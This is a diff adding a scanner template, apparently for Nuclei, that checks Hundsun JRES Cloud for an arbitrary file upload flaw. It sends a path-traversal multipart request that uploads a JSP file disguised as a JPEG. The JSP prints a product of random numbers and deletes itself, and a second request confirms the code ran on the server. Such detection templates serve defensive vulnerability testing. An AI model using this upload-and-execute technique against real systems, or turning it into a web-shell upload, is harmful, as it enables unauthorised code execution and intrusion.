@@ -1,0 +1,51 @@
+id: hengsheng-jres-file-upload
+info:
+  name: 恒生 JRES Cloud - 任意文件上传漏洞
+  author: Chaitin
+  severity: high
+  metadata:
+    verified: true
+    max-request: 2
+    vuln-id: CT-839348
+    vendor: hundsun
+    product: jres-cloud
+  tags: file-upload,vuln,hundsun
+variables:
+  filename: '{{to_lower(rand_text_alpha(6))}}'
+  s1: '{{rand_int(1000, 1500)}}'
+  s2: '{{rand_int(1000, 1500)}}'
+flow: http(1) && http(2)
+http:
+  - method: POST
+    path:
+      - '{{BaseURL}}/acm/api/v1/../../see/view/uploadImage.json'
+    redirects: false
+    headers:
+      Content-Type: multipart/form-data; boundary=59d81e90b0e121253e217b7bf32e48a1
+    body: |-
+      --59d81e90b0e121253e217b7bf32e48a1
+      Content-Disposition: form-data; name="fileName"
+
+      {{filename}}.jsp
+      --59d81e90b0e121253e217b7bf32e48a1
+      Content-Disposition: form-data; name="fileUrl"
+
+      /
+      --59d81e90b0e121253e217b7bf32e48a1
+      Content-Disposition: form-data; name="file"; filename="{{filename}}.jsp"
+      Content-Type: image/jpeg
+
+      <%out.print({{s1}} * {{s2}});new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+      --59d81e90b0e121253e217b7bf32e48a1-- 
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200 && contains(to_lower(body), to_lower("\"status\":")) && contains(to_lower(body), to_lower("\"url\":"))'
+  - method: GET
+    path:
+      - '{{BaseURL}}/acm/api/v1/../../{{filename}}.jsp'
+    redirects: false
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200 && contains(body, to_string(s1 * s2))'
